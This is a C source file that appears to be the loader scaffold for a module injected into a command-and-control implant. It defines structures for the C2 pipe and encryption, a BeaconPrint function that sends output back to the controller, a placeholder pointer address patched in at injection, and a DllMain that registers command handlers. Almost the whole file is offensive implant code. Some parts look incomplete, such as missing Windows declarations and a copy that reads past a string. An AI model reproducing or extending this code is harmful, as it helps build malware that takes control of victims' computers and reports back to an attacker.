#include <stdlib.h>
#include <string.h>
#define fs(x) free(x.data)
typedef struct c2struct{
    void* pipe;
    unsigned int type;
    unsigned int interval;
    void** cryptRx;
    void** cryptTx;
} C2;
typedef int(*d_send)(C2 blank, const char* data, int len);
typedef struct ptrs{
    void* send2;
    void* c2;
    unsigned int* cmds_k;
    void* bof_fns;
} PTRS;
PTRS* ptrs = (void*)0x1337133713371337;
d_send send2;
C2* c2;
unsigned int* cmds_k;
void** bof_fns;
int BeaconPrint(const char* data, int len){
    return send2(*c2, data, len);
}
typedef struct strstruct{
    unsigned char* data;
    unsigned int len;
} String;

String popstr(unsigned char** sp){
    String str;
    str.data = NULL;
    str.len = 0;
    unsigned int sz = 0;
    memcpy(&sz, *sp, 4);
    if((sz & (1<<31)) == 0)
        return str;
    sz = sz & ~(1<<31);
    *sp+=4;
    str.len = sz;
    str.data = malloc(sz+1);
    memcpy(str.data, *sp, sz+1);
    str.data[sz] = 0;
    *sp+=sz;
    return str;
}
unsigned int peekint(unsigned char* sp){
    unsigned int sz = 0;
    memcpy(&sz, sp, 4);
    return sz;
}
unsigned int popint(unsigned char** sp){
    unsigned int sz = 0;
    memcpy(&sz, *sp, 4);
    *sp+=4;
    return sz;
}
void pushint(unsigned int data, unsigned char** sp){
    *sp -= 4;
    memcpy(*sp, &data, 4);
}
void pushstr(String str, unsigned char** sp){
    *sp -= str.len;
    memcpy(*sp, str.data, str.len);
    pushint((str.len) | (1 << 31), sp);
}
#define BeaconPrints(x) BeaconPrint(x, strlen(x))
int main();
void add_fn(void* fptr, unsigned int id){
    int i=0;
    while(cmds_k[i] != 0) i++;
    cmds_k[i] = id;
    bof_fns[i] = fptr;
}
BOOL APIENTRY DllMain(void* hModule, int ul_reason_for_call, void* lpReserved){
    send2 = ptrs->send2;
    c2 = ptrs->c2;
    cmds_k = ptrs->cmds_k;
    bof_fns = ptrs->bof_fns;
    free(ptrs);
    ExitThread(main());
}